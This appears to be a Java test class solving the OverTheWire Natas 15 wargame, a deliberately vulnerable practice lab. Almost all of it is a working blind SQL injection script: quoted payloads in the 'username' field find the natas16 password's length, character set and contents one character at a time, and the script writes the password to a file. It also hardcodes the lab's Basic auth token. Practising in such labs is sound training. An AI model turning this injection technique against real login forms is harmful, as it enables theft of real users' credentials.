import io.restassured.response.Response;
import org.junit.jupiter.api.Test;
import java.io.IOException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class Natas15 extends BaseClass {
    final String url = "http://natas15.natas.labs.overthewire.org/index.php?debug";
    final String authToken = "Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==";

    public int guessLength() {
        int passLength = 0;

        while (true) {
            passLength++;
            Map<String, String> params = new HashMap<>();
            params.put("username", "natas16\" and length(password) >= "+ passLength + " and username =\"natas16");
            Response response = getRequestWithParams(url, authToken, params);
            if (response.asString().contains("This user doesn't exist.")) {
                passLength--;
                break;
            }
        }
        return passLength;
    }
    public String guessAlphabet() {
        StringBuilder sb = new StringBuilder();
        String allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        for (char c : allChars.toCharArray()) {
            Map<String, String> params = new HashMap<>();
            params.put("username", "natas16\" and password like binary \"%"+ c + "%\" and username =\"natas16");
            Response response = getRequestWithParams(url, authToken, params);
            if (response.asString().contains("This user exists."))
                sb.append(c);
        }

        return sb.toString();
    }

    @Test
    public void guessPass() {
        StringBuilder sb = new StringBuilder();
        String characters = guessAlphabet();
        while (sb.length() < guessLength()) {
            for (char c : characters.toCharArray()) {
                Map<String, String> params = new HashMap<>();
                params.put("username", "natas16\" and password like binary \"" + sb.toString() + c + "%\" and username =\"natas16");
                Response response = getRequestWithParams(url, authToken, params);
                if (response.asString().contains("This user exists."))
                    sb.append(c);
            }
        }
        try {
            writeTextToFile("src/test/resources/password.txt", sb.toString());
        }
        catch (IOException e) {
            System.out.println("Something went wrong: " + Arrays.toString(e.getStackTrace()));
        }
        System.out.println(sb.toString());


    }
}